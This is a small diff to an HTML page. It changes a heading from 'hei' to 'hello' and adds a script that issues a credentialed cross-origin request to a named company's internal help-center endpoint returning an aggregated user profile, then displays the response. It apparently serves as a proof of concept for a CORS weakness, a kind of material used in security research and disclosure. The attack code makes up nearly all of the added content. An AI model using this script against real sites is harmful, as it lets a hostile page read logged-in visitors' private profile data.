@@ -1,1 +1,14 @@
-<h1>hei</h1>
+
+<h1>hello</h1>
+
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://help.blockfi.com/hc/api/internal/en-us/aggregated_user_profile.json',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       alert(this.responseText);
+   };
+</script>
